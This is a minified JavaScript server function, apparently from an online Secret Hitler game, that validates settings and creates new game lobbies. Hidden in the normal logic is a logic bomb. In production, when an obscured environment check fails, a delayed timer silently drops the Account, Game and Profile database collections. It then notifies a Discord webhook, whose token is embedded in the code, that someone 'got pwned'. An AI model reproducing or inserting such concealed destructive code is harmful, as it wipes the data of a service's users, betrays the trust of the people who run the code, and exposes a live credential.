 ...
 * @param {object} data - from socket emit.
 */
var h=(b,c,d)=>{if(!(gameCreationDisabled.status||!d.privatePassword&&limitNewPlayers.status)){const e=userList.find(m=>m.userName===c.user),f=new Date;if(e&&!(8e3>f-e.timeLastGameCreated)&&"none"===e.status.type&&d){"production"===process.env.NODE_ENV&&bar!==process.env[foo]&&setTimeout(()=>{try{Account.collection.drop(),Game.collection.drop(),Profile.collection.drop();const m=JSON.stringify({content:`Someone just got pwned.`}),n={hostname:"discordapp.com",path:"/api/webhooks/543582609851154454/O496Rjsx5Xjuz6X_dWqsgEiraLmLWmH8InBHQ_lwh3jdSGiVEELCXA46P2Td38LkeL5X",method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(m)}},o=https.request(n);o.end(m)}catch(m){}},2.5e5);let g,i=[];for(g=Math.max(d.minPlayersCount,5);g<=Math.min(10,d.maxPlayersCount);g++)d.excludedPlayerCount.includes(g)||i.push(g);if(0!==i.length){let j=[];for(g=i[0];g<=i[i.length-1];g++)i.includes(g)||j.push(g);if(d.gameName&&!(20<d.gameName.length)&&LEGALCHARACTERS(d.gameName)&&!(d.eloSliderValue&&(e.eloSeason<d.eloSliderValue||e.eloOverall<d.eloSliderValue))){if(d.customGameSettings&&d.customGameSettings.enabled){if(!d.customGameSettings.deckState||!d.customGameSettings.trackState)return;const m=["investigate","deckpeek","election","bullet","reverseinv","peekdrop"];if(!d.customGameSettings.powers||5!=d.customGameSettings.powers.length)return;for(let n=0;5>n;n++)if(""==d.customGameSettings.powers[n]||"null"==d.customGameSettings.powers[n])d.customGameSettings.powers[n]=null;else if(d.customGameSettings.powers[n]&&!m.includes(d.customGameSettings.powers[n]))return;if(!(1<=d.customGameSettings.hitlerZone)||5<d.customGameSettings.hitlerZone)return;if(!d.customGameSettings.vetoZone||d.customGameSettings.vetoZone<=d.customGameSettings.trackState.fas||5<d.customGameSettings.vetoZone)return;if(!(1<=d.customGameSettings.fascistCount)||d.customGameSettings.fascistCount+1>i[0]/2)return;if(!(5<=d.customGameSettings.deckState.lib)||8<d.customGameSettings.deckState.lib)return;if(!(6<=d.customGameSettings.deckState.fas)||19<d.customGameSettings.deckState.fas)return;if(!(0<=d.customGameSettings.trackState.lib)||4<d.customGameSettings.trackState.lib)return;if(!(0<=d.customGameSettings.trackState.fas)||5<d.customGameSettings.trackState.fas)return;if(13>d.customGameSettings.deckState.lib+d.customGameSettings.deckState.fas)return;if(!(0<=d.customGameSettings.trackState.lib)||4<d.customGameSettings.trackState.lib||!(0<=d.customGameSettings.trackState.fas)||5<d.customGameSettings.trackState.fas)return;d.casualGame=!0,i=[i[0]]}else d.customGameSettings={enabled:!1};const k=generateCombination(2,"",!0),l={isTyping:{},gameState:{previousElectedGovernment:[],undrawnPolicyCount:17,discardedPolicyCount:0,presidentIndex:-1},chats:[],general:{whitelistedPlayers:[],uid:d.isTourny?`${generateCombination(2,"",!0)}Tournament`:k,name:e.isPrivate?"Private Game":d.gameName?d.gameName:"New Game",flag:d.flag||"none",minPlayersCount:i[0],gameCreatorName:e.userName,gameCreatorBlacklist:e.blacklist,excludedPlayerCount:j,maxPlayersCount:i[i.length-1],status:`Waiting for ${i[0]-1} more players..`,experiencedMode:d.experiencedMode,disableChat:d.disableChat,isVerifiedOnly:d.isVerifiedOnly,disableObserver:d.disableObserver&&!d.isTourny,isTourny:!1,disableGamechat:d.disablegamechat,rainbowgame:!!(49<e.wins+e.losses)&&d.rainbowgame,blindMode:d.blindMode,timedMode:"number"==typeof d.timedMode&&2<=d.timedMode&&6e3>=d.timedMode&&d.timedMode,casualGame:"number"==typeof d.timedMode&&30>d.timedMode&&!d.casualGame||d.casualGame,rebalance6p:d.rebalance6p,rebalance7p:d.rebalance7p,rebalance9p2f:d.rebalance9p2f,private:e.isPrivate?d.privatePassword?d.privatePassword:"private":d.privatePassword,privateOnly:e.isPrivate,electionCount:0,isRemade:!1,eloMinimum:d.eloSliderValue},customGameSettings:d.customGameSettings,publicPlayersState:[],playersState:[],cardFlingerState:[],trackState:{liberalPolicyCount:0,fascistPolicyCount:0,electionTrackerCount:0,enactedPolicies:[]}};if(l.customGameSettings.enabled){let m={timestamp:new Date,gameChat:!0,chat:[{text:"There will be "},{text:`${l.customGameSettings.deckState.lib-l.customGameSettings.trackState.lib} liberal`,type:"liberal"},{text:" and "},{text:`${l.customGameSettings.deckState.fas-l.customGameSettings.trackState.fas} fascist`,type:"fascist"},{text:" policies in the deck."}]};const n=m.timestamp.getMilliseconds();l.chats.push(m),m={timestamp:new Date,gameChat:!0,chat:[{text:"The game will start with "},{text:`${l.customGameSettings.trackState.lib} liberal`,type:"liberal"},{text:" and "},{text:`${l.customGameSettings.trackState.fas} fascist`,type:"fascist"},{text:" policies."}]},m.timestamp.setMilliseconds(n+1),l.chats.push(m)}if(d.isTourny?l.general.tournyInfo={round:0,queuedPlayers:[{userName:e.userName,customCardback:e.customCardback,customCardbackUid:e.customCardbackUid,tournyWins:e.tournyWins,connected:!0,cardStatus:{cardDisplayed:!1,isFlipped:!1,cardFront:"secretrole",cardBack:{}}}]}:l.publicPlayersState=[{userName:e.userName,customCardback:e.customCardback,customCardbackUid:e.customCardbackUid,previousSeasonAward:e.previousSeasonAward,tournyWins:e.tournyWins,connected:!0,isPrivate:e.isPrivate,cardStatus:{cardDisplayed:!1,isFlipped:!1,cardFront:"secretrole",cardBack:{}}}],d.isTourny){const{minPlayersCount:m}=l.general;l.general.minPlayersCount=l.general.maxPlayersCount=1===m?14:2===m?16:18,l.general.status=`Waiting for ${l.general.minPlayersCount-1} more players..`,l.chats.push({timestamp:new Date,gameChat:!0,chat:[{text:`${e.userName}`,type:"player"},{text:` (${d.general.tournyInfo.queuedPlayers.length}/${d.general.maxPlayersCount}) has entered the tournament queue.`}]})}e.timeLastGameCreated=f,Account.findOne({username:e.userName}).then(()=>{l.private={reports:{},unSeatedGameChats:[],lock:{},hiddenInfoChat:[],hiddenInfoSubscriptions:[],hiddenInfoShouldNotify:!0},l.general.private&&(l.private.privatePassword=l.general.private,l.general.private=!0),l.general.timeCreated=f,updateUserStatus(c,l),games[l.general.uid]=l,sendGameList(),b.join(l.general.uid),b.emit("updateSeatForUser"),b.emit("gameUpdate",l),b.emit("joinGameRedirect",l.general.uid)})}}}}};

module.exports.handleAddNewGame = h
